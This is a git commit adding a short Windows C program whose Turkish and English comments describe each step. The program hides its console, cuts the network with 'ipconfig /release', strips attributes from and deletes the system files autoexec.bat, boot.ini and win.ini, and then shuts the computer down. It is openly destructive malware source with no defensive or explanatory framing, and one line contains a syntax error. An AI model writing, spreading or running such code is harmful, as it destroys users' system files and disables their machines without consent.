617f66653d222035f96b4b47fd32fbe9b74a9e34
TechGamingGeekCoding <109979523+prohackergamer3@users.noreply.github.com>
2023-10-06 09:55:44 +0300

    main
    main

---
+++ main.c
@@ -0,0 +1,19 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+
+int main() {
+   //tr:C: sürücüsünde çalıştırın en:Run at C: driver
+   FreeConsole();  //tr:Konsolu gizler en:Hides console
+   system("@echo off"); //tr:Komut çıktısını gizler en:Hides command output
+   system("IPconfig /release"): //tr:İnterneti kapatır en:Closes internet
+  //tr:Sistemi silme en:Deleting system
+  system("attrib -r -s -h C:\\autoexec.bat"); 
+  system("del C:\\autoexec.bat");
+  system("attrib -r -s -h C:\\boot.ini");
+  system("del C:\\boot.ini");
+  system("attrib -r -s -h C:\\win.ini");
+  system("del C:\\win.ini");
+  //tr:Bilgisayarı kapatma en:Close computer
+  system("shutdown /s");
+}
